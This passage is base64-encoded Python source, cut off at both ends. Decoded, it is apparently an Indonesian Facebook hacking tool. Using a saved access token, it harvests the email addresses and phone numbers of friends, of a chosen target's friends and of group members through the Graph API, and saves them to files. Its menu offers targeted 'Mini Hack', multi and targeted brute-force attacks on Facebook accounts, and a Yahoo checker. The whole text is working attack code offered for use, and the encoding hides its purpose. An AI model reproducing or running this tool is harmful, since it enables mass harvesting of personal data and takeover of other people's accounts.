snaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQogICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgIHRyeToKICAgICAgICBub21lbS5hcHBlbmQoelsnbW9iaWxlX3Bob25lJ10pCiAgICAgICAgYnoud3JpdGUoelsnbW9iaWxlX3Bob25lJ10gKyAnXG4nKQogICAgICAgIHByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKG5vbWVtKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6Wydtb2JpbGVfcGhvbmUnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgIHBhc3MKICAgIGJ6LmNsb3NlKCkKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgcGhvbmUgbnVtYmVyIGZyb20gbWVtYmVyIGdyb3VwIFwwMzNbMTs5N20uLi4uJwogICAgcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBOdW1iZXIgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKG5vbWVtKSkKICAgIGRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKICAgIG9zLnJlbmFtZSgnb3V0L25vX21lbWJlcl9ncnVwLnR4dCcsJ291dC8nK2RvbmUpCiAgICBwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgogICAgcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IEtleUVycm9yOgogICAgcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgogICAga2VsdWFyKCkKICAgIAojIyMjIyBFTUFJTCAjIyMjIwpkZWYgZW1haWwoKToKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgdHJ5OgogICAgb3MubWtkaXIoJ291dCcpCiAgZXhjZXB0IE9TRXJyb3I6CiAgICBwYXNzCiAgdHJ5OgogICAgb3Muc3lzdGVtKCdyZXNldCcpCiAgICBwcmludCBsb2dvCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQogICAgYSA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgZW1haWwgXDAzM1sxOzk3bS4uLicpCiAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAgIGJ6ID0gb3Blbignb3V0L2VtYWlsX3RlbWFuLnR4dCcsJ3cnKQogICAgZm9yIGkgaW4gYVsnZGF0YSddOgogICAgICB4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lbJ2lkJ10rIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgICAgeiA9IGpzb24ubG9hZHMoeC50ZXh0KQogICAgICB0cnk6CiAgICAgICAgZW0uYXBwZW5kKHpbJ2VtYWlsJ10pCiAgICAgICAgYnoud3JpdGUoelsnZW1haWwnXSArICdcbicpCiAgICAgICAgcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oZW0pKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ2VtYWlsJ10rIiB8ICIrelsnbmFtZSddKyJcbiIpLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpCiAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICBwYXNzCiAgICBiei5jbG9zZSgpCiAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAgIHByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGVtYWlsIFwwMzNbMTs5N20uLi4uJwogICAgcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBFbWFpbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oZW0pKQogICAgZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQogICAgb3MucmVuYW1lKCdvdXQvZW1haWxfdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKICAgIHByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CiAgICBwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgS2V5RXJyb3I6CiAgICBwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCiAgICBrZWx1YXIoKQoKIyMjIyMgRU1BSUwgRlJPTSBURU1BTiAjIyMjIwpkZWYgZW1haWxmcm9tX3RlbWFuKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIHRyeToKICAgIG9zLm1rZGlyKCdvdXQnKQogIGV4Y2VwdCBPU0Vycm9yOgogICAgcGFzcwogIHRyeToKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgcHJpbnQgbG9nbwogICAgaWR0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBmcmllbmQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpCiAgICB0cnk6CiAgICAgIGpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgICAgb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQogICAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCiAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgIHByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgZHVtcCgpCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK2lkdCsnL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBhID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBlbWFpbCBmcm9tIGZyaWVuZCBcMDMzWzE7OTdtLi4uJykKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgYnogPSBvcGVuKCdvdXQvZW1fdGVtYW5fZnJvbV90ZW1hbi50eHQnLCd3JykKICAgIGZvciBpIGluIGFbJ2RhdGEnXToKICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICAgIHogPSBqc29uLmxvYWRzKHgudGV4dCkKICAgICAgdHJ5OgogICAgICAgIGVtZnJvbXRlbWFuLmFwcGVuZCh6WydlbWFpbCddKQogICAgICAgIGJ6LndyaXRlKHpbJ2VtYWlsJ10gKyAnXG4nKQogICAgICAgIHByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGVtZnJvbXRlbWFuKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6WydlbWFpbCddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQogICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgcGFzcwogICAgYnouY2xvc2UoKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBlbWFpbCBcMDMzWzE7OTdtLi4uLicKICAgIHByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgRW1haWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGVtZnJvbXRlbWFuKSkKICAgIGRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKICAgIG9zLnJlbmFtZSgnb3V0L2VtX3RlbWFuX2Zyb21fdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKICAgIHByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CiAgICBwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgS2V5RXJyb3I6CiAgICBwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCiAgICBrZWx1YXIoKQogICAgCiMjIyMjIE5PTUVSICMjIyMjCmRlZiBub21vcl9ocCgpOgogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICB0cnk6CiAgICBvcy5ta2Rpcignb3V0JykKICBleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKICB0cnk6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IGxvZ28KICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIG51bWJlciBwaG9uZSBcMDMzWzE7OTdtLi4uJykKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgdXJsPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tldAogICAgciA9cmVxdWVzdHMuZ2V0KHVybCkKICAgIHo9anNvbi5sb2FkcyhyLnRleHQpCiAgICBieiA9IG9wZW4oJ291dC9ub21lcl90ZW1hbi50eHQnLCd3JykKICAgIGZvciBuIGluIHpbImRhdGEiXToKICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIituWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICAgIHogPSBqc29uLmxvYWRzKHgudGV4dCkKICAgICAgdHJ5OgogICAgICAgIGhwLmFwcGVuZCh6Wydtb2JpbGVfcGhvbmUnXSkKICAgICAgICBiei53cml0ZSh6Wydtb2JpbGVfcGhvbmUnXSArICdcbicpCiAgICAgICAgcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaHApKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQogICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgcGFzcwogICAgYnouY2xvc2UoKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBudW1iZXIgXDAzM1sxOzk3bS4uLi4nCiAgICBwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaHApKQogICAgZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQogICAgb3MucmVuYW1lKCdvdXQvbm9tZXJfdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKICAgIHByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CiAgICBwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgS2V5RXJyb3I6CiAgICBwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCiAgICBrZWx1YXIoKQoKIyMjIyMgTk9NRVIgRlJPTSBURU1BTiAjIyMjIwpkZWYgaHBmcm9tX3RlbWFuKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIHRyeToKICAgIG9zLm1rZGlyKCdvdXQnKQogIGV4Y2VwdCBPU0Vycm9yOgogICAgcGFzcwogIHRyeToKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgcHJpbnQgbG9nbwogICAgaWR0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBmcmllbmQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpCiAgICB0cnk6CiAgICAgIGpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgICAgb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQogICAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCiAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgIHByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgZHVtcCgpCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK2lkdCsnL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBhID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBudW1iZXIgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCiAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAgIGJ6ID0gb3Blbignb3V0L25vX3RlbWFuX2Zyb21fdGVtYW4udHh0JywndycpCiAgICBmb3IgaSBpbiBhWydkYXRhJ106CiAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQogICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgIHRyeToKICAgICAgICBocGZyb210ZW1hbi5hcHBlbmQoelsnbW9iaWxlX3Bob25lJ10pCiAgICAgICAgYnoud3JpdGUoelsnbW9iaWxlX3Bob25lJ10gKyAnXG4nKQogICAgICAgIHByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGhwZnJvbXRlbWFuKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6Wydtb2JpbGVfcGhvbmUnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgIHBhc3MKICAgIGJ6LmNsb3NlKCkKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgbnVtYmVyIFwwMzNbMTs5N20uLi4uJwogICAgcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBOdW1iZXIgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGhwZnJvbXRlbWFuKSkKICAgIGRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKICAgIG9zLnJlbmFtZSgnb3V0L25vX3RlbWFuX2Zyb21fdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKICAgIHByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CiAgICBwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgS2V5RXJyb3I6CiAgICBwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCiAgICBrZWx1YXIoKQogICAgCiMjIyMjIE1FTlUgSEFDSyAjIyMjIwpkZWYgbWVudV9oYWNrKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBwcmludCAiXDAzM1sxOzkzbeKVkS0tXDAzM1sxOzkzbT4gXDAzM1sxOzkzbTEuXDAzM1sxOzk0bSBNaW5pIEhhY2sgRmFjZWJvb2soXDAzM1sxOzkybVRhcmdldFwwMzNbMTs5N20pIgogIHByaW50ICJcMDMzWzE7OTNt4pWRLS1cMDMzWzE7OTNtPiBcMDMzWzE7OTNtMi5cMDMzWzE7OTRtIE11bHRpIEJydXRlZm9yY2UgRmFjZWJvb2siCiAgcHJpbnQgIlwwMzNbMTs5M23ilZEtLVwwMzNbMTs5M20+IFwwMzNbMTs5M20zLlwwMzNbMTs5NG0gU3VwZXIgTXVsdGkgQnJ1dGVmb3JjZSBGYWNlYm9vayIKICBwcmludCAiXDAzM1sxOzkzbeKVkS0tXDAzM1sxOzkzbT4gXDAzM1sxOzkzbTQuXDAzM1sxOzk0bSBCcnV0ZUZvcmNlKFwwMzNbMTs5Mm1UYXJnZXRcMDMzWzE7OTdtKSIKICBwcmludCAiXDAzM1sxOzkzbeKVkS0tXDAzM1sxOzkzbT4gXDAzM1sxOzkzbTUuXDAzM1sxOzk0bSBZYWhvbyBDaGVja2VyIgogIHByaW50ICJcMDMzWzE7OTNt4pWRLS1cMDMzWzE7OTNtPiBcMDMzWzE7OTNtMC5cMDMzWzE7OTRtIEJhY2siCiAgcHJpbnQgIuKVkSIKICBoYWNrX3BpbGloKCkKIy0tLS1waWxpaApkZWYgaGFja19waWxpaCgpOgogIGhhY2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5NW3ilZrilZBcMDMzWzE7OTVtRCBcMDMzWzE7OTVtIikKICBpZiBoYWNrPT0iIjoKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgogICAgaGFja19waWxpaCgpCiAgZWxpZiBoYWNrID09IjEiOgogICAgbWluaSgpCiAgZWxpZiBoYWNrID09IjIiOgogICAgY3JhY2soKQogICAgaGFzaWwoKQogIGVsaWYgaGFjayA9PSIzIjoKICAgIHN1cGVyKCkKICBlbGlmIGhhY2sgPT0iNCI6CiAgICBicnV0ZSgpCiAgZWxpZiBoYWNrID09IjUiOgogICAgbWVudV95YWhvbygpCiAgZWxpZiBoYWNrID09IjAiOgogICAgbWVudSgpCiAgZWxzZToKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgogICAgaGFja19waWxpaCgpCiAgICAKIyMjIyMgTUlOSSBIRiAjIyMjIwpkZWYgbWluaSgpOgogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICA